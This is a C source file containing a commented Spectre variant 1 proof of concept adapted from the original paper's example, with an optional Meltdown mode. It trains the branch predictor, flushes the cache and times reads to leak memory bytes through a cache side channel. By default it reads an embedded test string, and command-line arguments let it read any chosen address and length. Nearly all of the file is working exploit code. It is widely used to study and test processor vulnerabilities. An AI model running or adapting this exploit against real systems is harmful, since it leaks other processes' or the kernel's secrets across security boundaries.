/*********************************************************************
 * Spectre PoC
 *
 * This source code originates from the example code provided in the
 * "Spectre Attacks: Exploiting Speculative Execution" paper found at
 * https://spectreattack.com/spectre.pdf
 *
 * Minor modifications have been made for readability
 * and additional comments to improve documentation.
 **********************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <limits.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define CACHE_LINE_SIZE 64 /* 64 for x86, 128 for some ARM's */
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
#define ARRAY2_STRIDE_SIZE 512 /* must be much greater than cache line size to overcome
                                  the prefetcher effects on neighbor cache lines */

/********************************************************************
  Victim code.
 ********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[CACHE_LINE_SIZE];
/* array1 values will be used to index the array2 so we can distinguish the
 * training_x from malicious_x in cache (array2) side effect */
uint8_t array1[16] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[CACHE_LINE_SIZE];
/* we will initialize array2 in main() due to zero pages for uninitialized globals */
uint8_t array2[256 * ARRAY2_STRIDE_SIZE];
uint8_t unused3[CACHE_LINE_SIZE];
#ifdef MELTDOWN
int fd;
#endif

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

__attribute__ ((noinline)) /* prevent inlining of the victim event with O3 compilation */
void victim_function(size_t x) {
	if (x < array1_size) {
		temp &= array2[array1[x] * ARRAY2_STRIDE_SIZE];
	}
}

/********************************************************************
  Analysis code
 ********************************************************************/

/* Report best guess in value[0] and second best in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	int results[256];
	int tries, i, j, k, mix_i, junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;

	for (i = 0; i < 256; i++) {
		results[i] = 0;
	}

   /* we try 1000 times to sniff the value from victim_function(), each time
    * with different training_x but attack phase is done with the same
    * malicious_x. This way we will differentiate the cache the side effects for
    * training run and the actual secret */
	for (tries = 0; tries < 1000; tries++) {

		training_x = tries % array1_size;

#ifdef MELTDOWN
      /* secret must be in cache for meltdown variant
       * (seems like) Intel prefetcher takes the privilege access bit into consideration
       * so we have to use syscall() instead of prefetch to load linux_proc_banner
       * UPDATE: According to Gruss, secret does not have to be in cache but the
       * PoC for that was not published yet.
       * https://twitter.com/lavados/status/951066835310534656
       * If you want to play around with existing code this is a good start
       * point (to prove Gruss's statement) */
		static char buf[4096];
		int ret = pread(fd, buf, sizeof(buf), 0);
		if (ret < 0) {
			perror("Error reading /proc/version");
         j = k = 0;
         goto exit;
		}
#endif

		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * ARRAY2_STRIDE_SIZE]); /* intrinsic for clflush instruction */

		/* 6 runs - 5 training runs (x=training_x) per 1 attack run * (x=malicious_x).
       * more runs help in cases when speculative execution didn't exhibit cache side effects */
		for (j = 5 * 10; j >= 0; j--) {
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 300; z++) {} /* Delay (can also mfence) */

			/* Bit twiddling instead of condition to set x=training_x if j%6!=0 or malicious_x if j%6==0
			 * This helps to avoid using conditional jump instruction before
          * call to victim_function(). Just in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads */
		for (i = 0; i < 256; i++) {
         /* Order is lightly mixed up to prevent stride prediction in
          * prefetcher. The linear modulo function is used for pseudo
          * randomization */
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * ARRAY2_STRIDE_SIZE];
			time1 = __rdtscp(&junk); /* READ TIMER */
			junk = *addr; /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

         /* In case of detected cache access, increase the score value.
          * Do not count the score for training values */
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[training_x])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}

		/* Locate highest & second-highest results */
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			} else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
      /* Break to exit in case the highest has twice score than the second highest */
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break;
	}

exit:
	results[0] ^= junk; /* use junk so code above won’t get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, const char **argv) {
	size_t malicious_x;
	int i, score[2], len, min;
	uint8_t value[2];

   /* Ensure that kernel will map separate physical pages instead of one
    * zero-page. That will allow us to use separate cache lines for cache access
    * side channel attack.
    * We manually write instead of using static initialization since there
    * is no guarantee in C std that static initialization will write to all
    * pages */
   for (i = 0; i < sizeof(array2); i++)
      array2[i] = 1;

	malicious_x = (size_t)(secret-(char*)array1); /* default for malicious_x */
   len = 40;

	if (argc == 3) {
#ifdef MELTDOWN
      fd = open("/proc/version", O_RDONLY);
      if (fd < 0) {
         perror("Error opening /proc/version");
         return -1;
      }
#endif
		sscanf(argv[1], "%p", (void**)(&malicious_x));
		malicious_x -= (size_t)array1; /* Convert input value into a pointer */
		sscanf(argv[2], "%d", &len);
	}

	printf("Reading %d bytes:\n", len);
	while (--len >= 0) {
		printf("Reading at malicious_x = %p %p ", (void*)malicious_x,
            (void*)((size_t)malicious_x+(size_t)array1));
		readMemoryByte(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
		printf("0x%02X=’%c’ score=%d ", value[0],
				(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
		printf("\n");
	}
	return (0);
}
